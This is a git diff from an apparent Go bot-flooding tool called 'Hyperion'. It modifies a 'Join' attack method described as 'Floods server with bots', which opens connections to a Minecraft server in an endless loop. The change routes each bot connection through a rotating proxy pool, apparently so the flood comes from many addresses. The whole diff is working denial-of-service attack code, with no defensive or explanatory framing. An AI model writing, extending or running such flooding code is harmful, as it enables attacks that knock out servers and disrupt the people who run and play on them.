@@ -2,11 +2,11 @@ package methods
 
 import (
 	"Hyperion/core"
+	"Hyperion/core/proxy"
 	"Hyperion/mc"
 	"Hyperion/mc/mcutils"
 	"Hyperion/utils"
 	"fmt"
-	"strconv"
 	"time"
 )
 
@@ -20,11 +20,11 @@ func (join Join) Description() string {
 	return "Floods server with bots"
 }
 
-func (join Join) Start(info core.AttackInfo) {
+func (join Join) Start(info *core.AttackInfo, dialPool *proxy.DialPool) {
 	for {
 		for i := 0; i < info.PerDelay; i++ {
 			go func() {
-				conn, err := mc.DialMC(info.Ip + ":" + strconv.Itoa(info.Port))
+				conn, err := mc.DialMC(info.Ip, info.Port, dialPool.GetNext())
 				if err != nil {
 					fmt.Println(err)
 				}
